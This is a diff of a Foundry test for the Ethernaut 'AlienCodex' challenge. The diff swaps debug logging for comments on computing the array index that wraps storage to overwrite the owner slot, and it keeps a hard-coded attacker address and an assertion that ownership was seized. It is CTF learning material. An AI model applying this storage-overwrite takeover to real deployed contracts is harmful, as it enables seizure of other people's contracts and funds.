@@ -1,5 +1,5 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.53;
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
 
 import {Test} from "forge-std/Test.sol";
 import {AlienCodex} from "../src/AlienCodex.sol";
@@ -16,16 +16,9 @@ contract AlienCodexTest is Test {
 
     function testOwnership() public {
         (uint256 slotOwner, uint256 slotContact, uint256 slotCodex) = alienCodex.getSlots();
-        console.log("ADDRESS", address(this));
-        console.log("ATTACKER", attaker);
-        console.log("--------------------------------");
-        console.log("slotOwner", slotOwner);
-        console.log("slotContact", slotContact);
-        console.log("slotCodex", slotCodex);
-        console.log("--------------------------------");
-        console.log("ownerData", alienCodex.getOwnerData());
-        console.log("contactData", alienCodex.getContactData());
-        console.log("--------------------------------");
+        //                                                                  2
+        // Need to to find the index of array => keccak256(abi.encode(slot_number)) + i = 0
+        // type(uint256).max === 2**256 - 1
 
         // Compute arr pinter: p = keccak256(abi.encodePacked(uint256(1)))
         bytes32 attackerBytes = 0x00000000000000000000000060a712D6C3bC7FE575958A39bD3BaF0DEcc79113;
@@ -38,3 +31,5 @@ contract AlienCodexTest is Test {
         assertEq(alienCodex.owner(), address(this));
     }
 }
+
+//
